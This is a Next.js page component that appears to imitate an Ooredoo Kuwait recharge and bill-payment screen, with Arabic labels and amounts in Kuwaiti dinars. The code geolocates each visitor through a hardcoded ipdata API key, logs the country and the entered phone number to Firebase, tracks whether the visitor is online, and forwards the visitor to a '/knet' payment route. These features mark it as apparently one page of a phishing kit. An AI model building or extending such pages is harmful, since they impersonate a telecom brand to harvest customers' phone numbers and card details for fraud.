"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"
import { ArrowLeft, Receipt } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"

export default function Page() {
  const router = useRouter()
  const [value, setValue] = useState("5")
  const [phone, setPhone] = useState("")
  const [isloading, setIsloading] = useState(false)
  const _id = randstr("oredoo-")

  function randstr(prefix: string) {
    return Math.random()
      .toString(36)
      .replace("0.", prefix || "")
  }

  async function getLocation() {
    const APIKEY = "a48dbc44c94452a8427c73683e68294f00a2892eee042a563ee1d07b"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      addData({
        id: _id,
        country: country,
      })
      localStorage.setItem("country", country)

      setupOnlineStatus(_id)
      return country
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }

  useEffect(() => {
    async function checkCountry() {
      try {
        // Get the country code
        await getLocation().then((v) => {})

        setIsloading(false)
      } catch (error) {
        console.error("Error in country detection:", error)
        setIsloading(false)
      }
    }

    checkCountry()
  }, [router])

  const handleSubmit = (e: any) => {
    e.preventDefault()
    setIsloading(true)
    const _id = localStorage.getItem("visitor")

    addData({ id: _id, phone })
    setTimeout(() => {
      setIsloading(false)
      router.push("/knet")
    }, 1000)
  }

  useEffect(() => {
    localStorage.setItem("total", value)
  }, [value])

  return (
    <div className="flex flex-col min-h-screen bg-white">
      <header className="flex justify-between items-center p-4 sticky top-0 z-50">
        <div className="flex items-center gap-2">
          <div className="flex items-center border border-gray-300 rounded-full px-3 py-1">
            <span className="text-sm font-medium">English</span>
            <span className="mx-2 text-gray-400">|</span>
            <span className="text-sm font-bold text-black">دفع</span>
          </div>
        </div>
        <button className="p-2 flex items-center" onClick={() => router.back()}>
          <ArrowLeft className="w-5 h-5" />
        </button>
      </header>

      <div className="w-full px-4 py-2">
        <div className="relative w-full overflow-hidden rounded-xl mb-6">
          <img
            src="/zf.png"
            alt="Smart Pay Promotion"
            className="w-full h-auto object-cover rounded-xl"
          />
        </div>

        <form className="w-full" onSubmit={handleSubmit}>
          <div className="flex justify-between mb-2">
            <div className="text-xl font-bold">رقم الموبايل</div>
            <div className="text-xl font-bold">المبلغ</div>
          </div>

          <div className="flex gap-3 mb-4">
            <div className="flex-1">
              <Input
                type="tel"
                maxLength={10}
                className="text-right py-6 border-gray-300 rounded-lg text-lg"
                placeholder=""
                value={phone}
                required
                onChange={(e) => setPhone(e.target.value)}
                dir="rtl"
              />
            </div>
            <div className="relative w-32">
              <Input
                type="tel"
                className="text-center py-6 text-lg font-medium border-gray-300 rounded-lg"
                value={value}
                maxLength={4}
                onChange={(e) => setValue(e.target.value)}
                dir="rtl"
              />
              <div className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 font-medium">د.ك</div>
              <button type="button" className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="lucide lucide-trash-2"
                >
                  <path d="M3 6h18" />
                  <path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6" />
                  <path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2" />
                  <line x1="10" x2="10" y1="11" y2="17" />
                  <line x1="14" x2="14" y1="11" y2="17" />
                </svg>
              </button>
            </div>
          </div>

          <Button
            type="button"
            className="w-full py-6 mb-8 bg-white text-red-500 border border-red-500 rounded-full text-lg font-medium"
          >
            الدفع لرقم آخر
          </Button>

          <div className="flex justify-between items-center mb-2 mt-8">
            <div className="flex items-center text-gray-700">
              <Receipt className="w-5 h-5 text-red-500 mr-2" />
              <div className="text-lg font-medium">إعادة التعبئة / دفع الفواتير</div>
            </div>
          </div>

          <div className="flex justify-between items-center mb-6">
            <div className="text-lg font-bold">د.ك {Number.parseFloat(value).toFixed(3)}</div>
            <div className="text-lg font-medium">الإجمالي:</div>
          </div>

          <Button
            type="submit"
            className={`w-full py-6 mt-4 bg-gray-200 text-gray-500 rounded-full text-lg font-medium ${isloading ? "opacity-80 cursor-not-allowed" : ""}`}
            disabled={isloading}
          >
            {isloading ? (
              <>
                <svg
                  className="animate-spin -ml-1 mr-3 h-5 w-5 text-gray-500"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path
                    className="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                  ></path>
                </svg>
                <span>جاري المعالجة...</span>
              </>
            ) : (
              <>
                <span>استمرار</span>
              </>
            )}
          </Button>
        </form>
      </div>
    </div>
  )
}
